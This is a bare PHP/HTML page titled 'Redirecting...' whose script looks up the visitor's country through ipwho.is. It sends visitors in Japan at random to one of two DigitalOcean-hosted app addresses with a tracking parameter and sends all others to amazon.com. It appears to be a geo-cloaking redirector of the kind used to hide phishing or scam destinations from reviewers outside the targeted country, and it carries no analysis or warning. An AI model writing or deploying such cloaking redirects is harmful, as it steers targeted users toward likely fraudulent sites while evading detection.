<?php
  ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>

<script>
fetch("https://ipwho.is/")
  .then(response => response.json())
  .then(data => {
    if (!data.success) {
      return;
    }

    const countryCode = data.country_code;

    if (countryCode === "JP") {
      (function () {
        const domainA = "https://oyster-app-u4m5l.ondigitalocean.app/?bcda=(0101)-88844-98569";
        const domainB = "https://sea-turtle-app-7mg8g.ondigitalocean.app/?bcda=(0101)-88844-98569";

        // Random number between 0 and 1
        if (Math.random() < 0.5) {
            window.location.replace(domainA);
        } else {
            window.location.replace(domainB);
        }
    })();
    } else {
      window.location.replace("https://www.amazon.com/");
    }
  })
  .catch(error => {
    console.error("Error fetching location:", error);
  });

</script>

</head>
<body>
</body>
</html>
